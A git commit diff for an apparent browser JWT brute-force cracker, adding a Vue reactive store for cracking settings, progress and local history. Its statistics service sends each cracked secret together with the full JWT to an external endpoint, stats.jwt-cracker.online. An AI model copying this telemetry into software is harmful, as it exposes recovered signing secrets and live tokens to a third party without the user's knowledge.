e607a7ec2e5d0cb52f066c6daf2fe4fc55e003fd
Jonathan Platteau <jonathan.platteau@yahoo.fr>
2024-10-23 12:25:39 +0200

    feat(store): create deported store with reactive state

--- src/services/statistics.ts
+++ src/services/statistics.ts
@@ -1,23 +1,36 @@
-interface Session {
-  secret: string;
-  token: string;
-}
+import { Method, store } from "./store";
 
 const endpoint = import.meta.env.PROD
   ? "https://stats.jwt-cracker.online:8008/complete"
   : "http://localhost:8082/complete";
 
-export const sendSuccess = ({ secret, token }: Session) => {
+export function dispatchSuccessEvent() {
   if (import.meta.env.PROD) {
-    cabin.event(secret + " : " + token);
+    cabin.event(store.secret + " : " + store.token);
   } else {
-    console.log(secret + " : " + token);
+    console.info(store.secret + " : " + store.token);
   }
   fetch(endpoint, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({ secret, jwt: token }),
-  }).catch((err) => console.error(err));
-};
+    body: JSON.stringify({
+      secret: store.secret,
+      jwt: store.token,
+      duration: store.timeElapsed(),
+      cpu: navigator.hardwareConcurrency || 1,
+      ...(store.method === Method.alphabet
+        ? {
+            alphabet: store.alphabetSelected,
+          }
+        : {
+            dictionary: store.dictionarySelected?.dictionaryURL,
+          }),
+    }),
+  }).catch((err) => {
+    if (import.meta.env.DEV) {
+      console.error(err);
+    }
+  });
+}
---
+++ src/services/store.ts
@@ -0,0 +1,137 @@
+import { reactive, computed } from "vue";
+
+const DEFAULT_ALPHABET =
+  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+const DEFAULT_ALPHABET_MAX_LENGTH = 6;
+
+export enum Method {
+  alphabet = "alphabet",
+  dictionary = "dictionary",
+  dictionaryCustom = "custom",
+}
+
+interface Dictionary {
+  name: string;
+  dictionaryURL: string;
+  rawSize: number;
+}
+
+const defaultState = {
+  token: "",
+  isTokenLocked: false,
+
+  secret: null as string | null,
+
+  method: null as Method | null,
+
+  alphabetSelected: DEFAULT_ALPHABET,
+  isAlphabetLocked: false,
+  alphabetMaxLength: DEFAULT_ALPHABET_MAX_LENGTH,
+
+  dictionarySelected: null as Dictionary | null,
+  isDictionaryLocked: false,
+
+  customDictionaryURL: null as string | null,
+  isCustomDictionaryLocked: false,
+
+  startTime: null as Date | null,
+  stopTime: null as Date | null,
+
+  isDone: false,
+
+  progressPercent: 0,
+  downloadPercent: 0,
+};
+
+export const store = reactive({
+  ...defaultState,
+
+  timeElapsed() {
+    if (!this.startTime) {
+      return 0;
+    }
+    const differenceInMilliseconds =
+      (this.stopTime || new Date()).getTime() - this.startTime.getTime();
+    const seconds = Math.floor(differenceInMilliseconds / 1000);
+
+    return seconds;
+  },
+
+  end() {
+    this.stopTime = new Date();
+    this.isDone = true;
+  },
+
+  reset() {
+    this.secret = null;
+    this.isDone = false;
+    this.startTime = null;
+    this.stopTime = null;
+    this.downloadPercent = 0;
+    this.progressPercent = 0;
+  },
+
+  start() {
+    this.reset();
+    this.startTime = new Date();
+  },
+
+  hardReset() {
+    this.reset();
+    this.isTokenLocked = false;
+    this.token = "";
+  },
+
+  onSuccess(secretFound: string) {
+    this.secret = secretFound;
+    this.end();
+
+    addToHistory({
+      token: this.token,
+      secret: this.secret,
+      date: new Date().toISOString(),
+      method: this.method!,
+    });
+  },
+
+  setMethod(method: Method) {
+    this.method = method;
+    if (method !== Method.dictionary) {
+      this.isDictionaryLocked = false;
+    }
+    if (method !== Method.alphabet) {
+      this.isAlphabetLocked = false;
+    }
+    if (method !== Method.dictionaryCustom) {
+      this.isCustomDictionaryLocked = false;
+    }
+  },
+
+  updateDownloadProgress(downloadPercent: number) {
+    this.downloadPercent = downloadPercent;
+  },
+
+  updateGlobalProgress(progressPercent: number) {
+    this.progressPercent = progressPercent;
+    if (progressPercent === 100) {
+      this.end();
+    }
+  },
+});
+
+export const hasStarted = computed(
+  () => store.startTime !== null && !store.isDone,
+);
+
+interface HistoryShard {
+  token: string;
+  secret: string;
+  method: Method;
+  date: string;
+}
+
+const addToHistory = (historyShard: HistoryShard) => {
+  const history = JSON.parse(localStorage.getItem("history") || "[]");
+  history.push(historyShard);
+  localStorage.setItem("history", JSON.stringify(history));
+};
